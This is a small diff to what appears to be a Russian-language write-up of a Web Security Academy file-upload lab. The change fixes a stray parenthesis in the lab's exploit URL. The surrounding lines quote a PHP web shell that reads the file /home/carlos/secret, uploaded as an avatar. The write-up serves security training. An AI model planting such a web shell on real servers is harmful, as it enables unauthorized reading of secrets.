@@ -34,7 +34,7 @@
 ```text
 Тестовый shell: <?php echo "Hello world"; ?>
 Финальный shell: <?php echo file_get_contents('/home/carlos/secret'); ?>
-URL для выполнения: (https://0aec005903c5388a802e6c58000d00ec.web-security-academy.net/files/avatars/exploit.php))
+URL для выполнения: (https://0aec005903c5388a802e6c58000d00ec.web-security-academy.net/files/avatars/exploit.php)
 ```
 
 **Почему это сработало:**  
